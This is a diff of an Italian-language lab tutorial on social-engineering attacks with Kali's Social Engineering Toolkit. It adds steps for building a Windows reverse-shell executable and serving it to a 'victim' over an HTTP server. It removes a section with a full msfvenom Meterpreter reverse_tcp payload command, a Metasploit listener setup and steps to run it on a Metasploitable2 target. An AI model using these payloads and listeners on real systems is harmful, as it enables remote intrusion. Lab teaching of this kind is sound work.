@@ -64,6 +64,19 @@ Specificare URL del sito da clonare. Il sito deve avere una form di login
 
 Aprite Firefox e visitate il sito web digitando localhost nella barra degli indirizzi del browser e inserite un’ indirizzo email e una password fasulli
 
+## Creare un eseguibile malevolo per Windows
+
+Dal menù principale del Social Engineering Toolkit selezionare opzione 4) Website Attack Vector
+
+Poi selezionare l'opzione Windows Shell Reverse TCP x64.
+
+![image](payload.png)
+
+Aprite un terminale e create un http server con il comando per trasferire il file sulla macchina della vittima.
+
+```
+python3 -m http.server 8888
+```
 
 ## Creare Chiavetta USB infetta 
 
@@ -98,49 +111,7 @@ Specificare l'url del sito web di phishing a cui redirigere le potenziali vittim
 
 Aprite qrcode_attack.png con un QRCode scanner online e.g Web QR per vedere che il QRCode punta al sito malevolo
 
-## Creare un payload malevolo con msfvenom 
 
-**msfvenom** è uno strumento del framework Metasploit utilizzato per generare payload malevoli. Per creare un payload malevolo per Linux, seguiamo i seguenti passaggi.
-
-Aprite un terminale e digitate il seguente comando:
-
-```
-# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP KALI VM> LPORT=<Porta> -f elf -o payload.elf
-```
-
-* -p linux/x86/meterpreter/reverse_tcp: Specifica il tipo di payload. In questo caso, stiamo utilizzando una reverse shell Meterpreter per Linux.
-* LHOST=<IP KALI VM >: L'indirizzo IP della macchina che riceverà la connessione reverse shell. Nel nostro caso la macchina Kali Linux.
-* LPORT=<Porta>: La porta sulla quale la tua macchina ascolterà la connessione reverse shell
-* -f elf: Specifica il formato del payload. Per Linux, il formato ELF è comunemente usato.
-* -o payload.elf: Specifica il nome del file di output che conterrà il payload.
-
-Una volta generato il payload, è necessario configurare un listener sulla  macchina  Kali Linux per ricevere la connessione reverse shell. Questo può essere fatto utilizzando Metasploit:
-
-```
-# msfconsole
-# use exploit/multi/handler
-# set payload linux/x86/meterpreter/reverse_tcp
-# set LHOST <IP>
-# set LPORT <Porta>
-# exploit
-```
-* use exploit/multi/handler: Seleziona il modulo handler per gestire la connessione incoming.
-* set payload linux/x86/meterpreter/reverse_tcp: Specifica il tipo di payload che il listener si aspetta di ricevere.
-* set LHOST <IP>: Configura l'indirizzo IP della macchina Kali.
-* set LPORT <Porta>: Configura la porta sulla quale la tua macchina ascolterà.
-* exploit: Avvia il listener.
-
-Trasferite il file payload.elf sulla macchina Metasploitable2  e rendetelo eseguibile con il comando:
-
-```
-# chmod +x payload.elf
-```
-Eseguite il payload sulla macchina target:
-
-```
-# ./payload.elf
-```
-Una volta eseguito il payload, dovrebbe stabilire una connessione con il listener configurato sulla macchina Kali Linux, permettendoti di ottenere una sessione Meterpreter sulla macchina Metasploitable2.
 
 ## Simulare una campagna di phishing con GoPhish
 
